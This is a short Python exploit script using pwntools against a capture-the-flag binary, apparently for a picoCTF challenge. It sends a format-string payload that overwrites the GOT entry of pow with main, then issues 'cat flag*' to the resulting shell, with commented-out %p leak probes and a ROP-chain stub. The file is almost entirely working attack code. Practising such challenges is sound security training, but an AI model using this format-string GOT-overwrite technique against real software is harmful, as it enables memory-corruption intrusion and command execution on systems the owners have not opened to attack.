#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './chall' 

LOCAL = True

if LOCAL:
  r = process(fname)
else:
  r = remote('mars.picoctf.net', 31929)

e      = ELF(fname)
# libc   = ELF(e.runpath.decode() + 'libc.so.6')
# rop    = ROP(e)
#rop   = ROP(libc, base=libc.address)

def get_flag():
  pause(1)
  r.sendline('cat flag*')
  success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')

#r.sendline(b'9'*8 + b'%p'*100)
#r.sendline(b'9'*8 + b'%p-'*100)
#r.sendline('1')

writes = {e.got.pow : e.sym.main}
r.sendline(fmtstr_payload(9, writes))
r.sendline('1')

print(r.recv())
# payload = flat({
#   off: rop.chain()
#  })
